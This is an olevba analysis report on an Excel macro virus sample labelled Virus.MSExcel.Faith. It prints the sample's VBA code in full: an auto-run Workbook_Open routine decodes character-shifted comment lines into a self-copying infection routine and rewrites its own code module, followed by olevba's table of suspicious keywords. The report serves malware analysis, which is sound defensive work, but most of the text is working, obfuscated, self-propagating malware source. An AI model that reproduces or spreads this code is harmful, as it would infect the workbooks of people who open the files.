olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Faith-14e27abc97828f02ab39f13fc45b6ad5c6d7e9f5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Faith-14e27abc97828f02ab39f13fc45b6ad5c6d7e9f5 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
If Workbooks.Count > 1 Then
For d = 9 To 19: C$ = ""
I = (ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) - f: C$ = C$ & Chr(B$): Next X: A = C$
ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d
Call Good_Faith: End If: End Sub
Private Sub Good_Faith()
'6Gvvroigzout4JoyvrgGrkxzy&C&Lgryk
'5Xjy%HR%B%Ymnx\twpgttp3[GUwtojhy3[GHtrutsjsyx3Nyjr-6.3HtijRtizqj
'5Ktw%i%B%>%Yt%6>?%H)%B%''?%N%B%-HR3Qnsjx-i1%6..
'3i#@#Lqw+Uqg#-#;,#.#4=#Iru#[#@#4#Wr#Ohq+L,=#E'#@#Dvf+Plg+L/#[/#4,,#.#i=#F'#@#F'#)#Fku+E',=#Qh{w#[=#D#@#F'
'3WklvZrunerrn1YESurmhfw1YEFrpsrqhqwv1Lwhp+4,1FrghPrgxoh1UhsodfhOlqh#g/#%*%#)#i#)#D=#Qh{w#g
'7TJ'D'JT5Spulz/83'JT5Jv|u{VmSpulz0
'1Gps!Iptu!>!2!Up!Xpslcpplt/Dpvou
'7^p{o'^vyrivvrz5P{lt/Ovz{05]IWyvqlj{5]IJvtwvulu{z5P{lt/805JvklTvk|sl
'75Klsl{lSpulz'83'5Jv|u{VmSpulzA'5HkkMyvtZ{ypun'TJA'Luk'^p{o
'6]uxqhuuqy4Ozks.Nuyz/4Yg|kGy&Lorktgsk@C]uxqhuuqy4Ozks.Nuyz/4L{rrTgsk
'1Ofyu!Iptu!(Hppe!Gbjui!Cz!Mzt!Lpwjdl///!Ifmmp-!WYfs(t!Boe!BWfs(t
End Sub
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Faith-14e27abc97828f02ab39f13fc45b6ad5c6d7e9f5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Faith-14e27abc97828f02ab39f13fc45b6ad5c6d7e9f5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Faith-14e27abc97828f02ab39f13fc45b6ad5c6d7e9f5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

